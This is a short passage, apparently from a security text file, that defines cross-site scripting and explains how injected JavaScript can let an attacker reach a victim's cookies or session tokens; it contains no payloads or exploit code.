[+] [2]: Cross Site Scripting :
[+] Cross site scripting (also referred to as XSS) is a vulnerability that
allows an attacker to send malicious code (usually in the form of
Javascript) to another user. Because a browser cannot know if the script
should be trusted or not, it will execute the script in the user context
allowing the attacker to access any cookies or session tokens retained by
the browser.
